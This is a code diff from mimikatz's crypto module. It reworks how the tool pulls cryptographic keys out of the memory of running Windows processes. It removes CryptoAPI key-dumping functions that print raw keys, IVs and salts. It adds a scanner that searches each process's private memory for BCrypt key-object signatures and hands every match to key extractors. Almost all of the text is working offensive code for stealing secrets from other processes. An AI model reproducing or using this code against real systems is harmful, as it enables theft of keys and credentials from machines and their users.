@@ -2090,144 +2090,7 @@ NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-void kuhl_m_crypto_extract_dealKey32(PKULL_M_MEMORY_ADDRESS address)
-{
-	KIWI_CRYPTKEY32 kKey;
-	KIWI_UNK_INT_KEY32 kUnk;
-	KIWI_RAWKEY32 kRaw;
-	KULL_M_MEMORY_ADDRESS aLocalBuffer = {&kKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
-	DWORD i;
-	BYTE k;
-	if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_CRYPTKEY32)))
-	{
-		if(address->address = ULongToPtr(kKey.obfKiwiIntKey ^ RSAENH_KEY_32))
-		{
-			aLocalBuffer.address = &kUnk;
-			if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_UNK_INT_KEY32)))
-			{
-				if(kUnk.unk0 > 1 && kUnk.unk0 < 4)
-				{
-					if(address->address = ULongToPtr(kUnk.KiwiRawKey))
-					{
-						aLocalBuffer.address = &kRaw;
-						if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_RAWKEY32)))
-						{
-							if(kRaw.Algid && (kRaw.Algid <= 0xffff) && kRaw.dwData <= 0x8000)
-							{
-								kprintf(L"\nAlgid     : %s (0x%x)\n", kull_m_crypto_algid_to_name(kRaw.Algid), kRaw.Algid);
-								kprintf(L"Key (%3u) : ", kRaw.dwData);
-								if(address->address = ULongToPtr(kRaw.Data))
-								{
-									if(aLocalBuffer.address = LocalAlloc(LPTR, kRaw.dwData))
-									{
-										if(kull_m_memory_copy(&aLocalBuffer, address,  kRaw.dwData))
-											kull_m_string_wprintf_hex(aLocalBuffer.address, kRaw.dwData, 0);
-										else PRINT_ERROR(L"Unable to read from @ %p", address->address);
-										LocalFree(aLocalBuffer.address);
-									}
-								}
-								kprintf(L"\n", kRaw.dwData);
-								if(GET_ALG_TYPE(kRaw.Algid) == ALG_TYPE_BLOCK)
-								{
-									kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_kp_mode_to_str(kRaw.dwMode), kRaw.dwMode);
-									//kprintf(L"BlockLen  : %u\n", kRaw.dwBlockLen);
-									//kprintf(L"effKeyLen : %u\n", pRawKey->dwEffectiveKeyLen / 8);
-									for(i = 0, k = 0; !k && (i < kRaw.dwBlockLen); k |= kRaw.IV[i++]);
-									if(k)
-									{
-										kprintf(L"IV        : ");
-										kull_m_string_wprintf_hex(kRaw.IV, kRaw.dwBlockLen, 0);
-										kprintf(L"\n");
-									}
-								}
-								if(kRaw.dwSalt)
-								{
-									kprintf(L"Salt      : ");
-									kull_m_string_wprintf_hex(kRaw.Salt, kRaw.dwSalt, 0);
-									kprintf(L"\n");
-								}
-								//kprintf(L"Flags     : 0x%08x\n", kRaw.Flags);
-								//kprintf(L"Perm.     : ");
-								//kull_m_crypto_kp_permissions_descr(kRaw.dwPermissions);
-								//kprintf(L"(0x%08x)\n",kRaw.dwPermissions);
-							}
-						}
-					}
-				}
-			}
-		}
-	}
-}
-#ifdef _M_X64
-void kuhl_m_crypto_extract_dealKey64(PKULL_M_MEMORY_ADDRESS address)
-{
-	KIWI_CRYPTKEY64 kKey;
-	KIWI_UNK_INT_KEY64 kUnk;
-	KIWI_RAWKEY64 kRaw;
-	KULL_M_MEMORY_ADDRESS aLocalBuffer = {&kKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
-	DWORD i;
-	BYTE k;
-	if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_CRYPTKEY64)))
-	{
-		if(address->address = (PVOID) (kKey.obfKiwiIntKey ^ RSAENH_KEY_64))
-		{
-			aLocalBuffer.address = &kUnk;
-			if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_UNK_INT_KEY64)))
-			{
-				if(kUnk.unk0 > 1 && kUnk.unk0 < 4)
-				{
-					if(address->address = (PVOID) kUnk.KiwiRawKey)
-					{
-						aLocalBuffer.address = &kRaw;
-						if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_RAWKEY64)))
-						{
-							if(kRaw.Algid && (kRaw.Algid <= 0xffff) && kRaw.dwData <= 0x8000)
-							{
-								kprintf(L"\nAlgid     : %s (0x%x)\n", kull_m_crypto_algid_to_name(kRaw.Algid), kRaw.Algid);
-								kprintf(L"Key (%3u) : ", kRaw.dwData);
-								if(address->address = (PVOID) kRaw.Data)
-								{
-									if(aLocalBuffer.address = LocalAlloc(LPTR, kRaw.dwData))
-									{
-										if(kull_m_memory_copy(&aLocalBuffer, address,  kRaw.dwData))
-											kull_m_string_wprintf_hex(aLocalBuffer.address, kRaw.dwData, 0);
-										else PRINT_ERROR(L"Unable to read from @ %p", address->address);
-										LocalFree(aLocalBuffer.address);
-									}
-								}
-								kprintf(L"\n", kRaw.dwData);
-								if(GET_ALG_TYPE(kRaw.Algid) == ALG_TYPE_BLOCK)
-								{
-									kprintf(L"Mode      : %s (0x%x)\n", kull_m_crypto_kp_mode_to_str(kRaw.dwMode), kRaw.dwMode);
-									//kprintf(L"BlockLen  : %u\n", kRaw.dwBlockLen);
-									//kprintf(L"effKeyLen : %u\n", pRawKey->dwEffectiveKeyLen / 8);
-									for(i = 0, k = 0; !k && (i < kRaw.dwBlockLen); k |= kRaw.IV[i++]);
-									if(k)
-									{
-										kprintf(L"IV        : ");
-										kull_m_string_wprintf_hex(kRaw.IV, kRaw.dwBlockLen, 0);
-										kprintf(L"\n");
-									}
-								}
-								if(kRaw.dwSalt)
-								{
-									kprintf(L"Salt      : ");
-									kull_m_string_wprintf_hex(kRaw.Salt, kRaw.dwSalt, 0);
-									kprintf(L"\n");
-								}
-								//kprintf(L"Flags     : 0x%08x\n", kRaw.Flags);
-								//kprintf(L"Perm.     : ");
-								//kull_m_crypto_kp_permissions_descr(kRaw.dwPermissions);
-								//kprintf(L"(0x%08x)\n",kRaw.dwPermissions);
-							}
-						}
-					}
-				}
-			}
-		}
-	}
-}
-#endif
+
 
 BOOL CALLBACK kuhl_m_crypto_extract_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
 {
@@ -2267,10 +2130,10 @@ BOOL CALLBACK kuhl_m_crypto_extract_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMe
 						aKey.address = cur + ((PBYTE) aRemote.address - (PBYTE) aLocalBuffer.address);
 						#ifdef _M_X64
 						if(ps->Machine == IMAGE_FILE_MACHINE_AMD64)
-							kuhl_m_crypto_extract_dealKey64(&aKey);
+							kuhl_m_crypto_extractor_capi64(&aKey);
 						else
 						#endif
-							kuhl_m_crypto_extract_dealKey32(&aKey);
+							kuhl_m_crypto_extractor_capi32(&aKey);
 					}
 				}
 			}
@@ -2347,6 +2210,63 @@ BOOL CALLBACK kuhl_m_crypto_extract_exports_callback_module_exportedEntry64(PKUL
 }
 #endif
 
+const BYTE Bcrypt64[] = {0x20, 0x00, 0x00, 0x00, 0x52, 0x55, 0x55, 0x55}, Bcrypt64_old[] = {0x18, 0x00, 0x00, 0x00, 0x52, 0x55, 0x55, 0x55};
+const BYTE Bcrypt32[] = {0x14, 0x00, 0x00, 0x00, 0x52, 0x55, 0x55, 0x55}, Bcrypt32_old[] = {0x10, 0x00, 0x00, 0x00, 0x52, 0x55, 0x55, 0x55};
+BOOL CALLBACK kuhl_m_crypto_extract_MemoryAnalysisBCrypt(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
+{
+	PKIWI_CRYPT_SEARCH ps = (PKIWI_CRYPT_SEARCH) pvArg;
+	KULL_M_MEMORY_ADDRESS aLocalBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
+		aRemote = {pMemoryBasicInformation->BaseAddress, ps->hMemory}, aKey = aRemote;
+	PBYTE cur, limite;
+	DWORD size = 
+		#ifdef _M_X64
+		(ps->Machine == IMAGE_FILE_MACHINE_AMD64) ? sizeof(Bcrypt64) : sizeof(Bcrypt32);
+		#else
+		sizeof(Bcrypt32);
+		#endif
+	
+	if((pMemoryBasicInformation->Type == MEM_PRIVATE) && (pMemoryBasicInformation->State != MEM_FREE) && (pMemoryBasicInformation->Protect == PAGE_READWRITE))
+	{
+		if(aLocalBuffer.address = LocalAlloc(LPTR, pMemoryBasicInformation->RegionSize))
+		{
+			limite = (PBYTE) aLocalBuffer.address + pMemoryBasicInformation->RegionSize - size;
+			if(kull_m_memory_copy(&aLocalBuffer, &aRemote, pMemoryBasicInformation->RegionSize))
+			{
+				for(cur = (PBYTE) aLocalBuffer.address; cur < limite; cur += (ps->Machine == IMAGE_FILE_MACHINE_AMD64) ? sizeof(DWORD64) : sizeof(DWORD32))
+				{
+					if(
+						#ifdef _M_X64
+						RtlEqualMemory(cur, (ps->Machine == IMAGE_FILE_MACHINE_AMD64) ?
+						((MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt64_old : Bcrypt64)
+						:
+						((MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt32_old : Bcrypt32)
+						, size)
+						#else
+						RtlEqualMemory(cur, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt32_old : Bcrypt32, size) 
+						#endif
+					)
+					{
+						if(ps->currPid != ps->prevPid)
+						{
+							ps->prevPid = ps->currPid;
+							kprintf(L"\n%wZ (%u)\n", ps->processName, ps->currPid);
+						}
+						aKey.address = cur + ((PBYTE) aRemote.address - (PBYTE) aLocalBuffer.address);
+						#ifdef _M_X64
+						if(ps->Machine == IMAGE_FILE_MACHINE_AMD64)
+							kuhl_m_crypto_extractor_bcrypt64(&aKey);
+						else
+						#endif
+							kuhl_m_crypto_extractor_bcrypt32(&aKey);
+					}
+				}
+			}
+			LocalFree(aLocalBuffer.address);
+		}
+	}
+	return TRUE;
+}
+
 BOOL CALLBACK kuhl_m_crypto_extract_ProcessAnalysis(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
 {
 	PKIWI_CRYPT_SEARCH ps = (PKIWI_CRYPT_SEARCH) pvArg;
@@ -2387,6 +2307,18 @@ BOOL CALLBACK kuhl_m_crypto_extract_ProcessAnalysis(PSYSTEM_PROCESS_INFORMATION 
 								ps->currPid = pid;
 								ps->processName = &pSystemProcessInformation->ImageName;
 								kull_m_process_getMemoryInformations(aRemote.hMemory, kuhl_m_crypto_extract_MemoryAnalysis, pvArg);
+							}
+						}
+
+						if(MIMIKATZ_NT_MAJOR_VERSION > 5)
+						{
+							if(kull_m_process_getVeryBasicModuleInformationsForName(aRemote.hMemory, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"bcrypt.dll" : L"bcryptprimitives.dll", &cryptInfos))
+							{
+								ps->Machine = pNtHeaders->FileHeader.Machine;
+								ps->bAllProcessKiwiCryptKey = FALSE;
+								ps->currPid = pid;
+								ps->processName = &pSystemProcessInformation->ImageName;
+								kull_m_process_getMemoryInformations(aRemote.hMemory, kuhl_m_crypto_extract_MemoryAnalysisBCrypt, pvArg);
 							}
 						}
 						LocalFree(pNtHeaders);
